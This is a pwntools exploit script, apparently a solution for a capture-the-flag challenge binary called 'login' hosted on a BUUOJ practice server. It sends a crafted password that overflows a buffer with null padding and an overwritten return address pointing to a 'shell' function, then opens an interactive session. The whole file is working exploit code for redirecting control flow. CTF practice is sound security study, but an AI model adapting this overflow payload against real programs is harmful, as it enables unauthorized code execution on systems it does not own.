import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./login')
	elf=ELF('./login')
	#libc=ELF('')
else :
	io=remote('node3.buuoj.cn',28859)
	elf=ELF('./login')
	#libc=ELF('')


shell = 0x400e88
io.sendlineafter(': ','admin')
gdb.attach(io)
pause()
io.sendafter(': ','2jctf_pa5sw0rd'+'\x00'*58+p64(shell)[:-1])

# gdb.attach(io)
# pause()
io.interactive()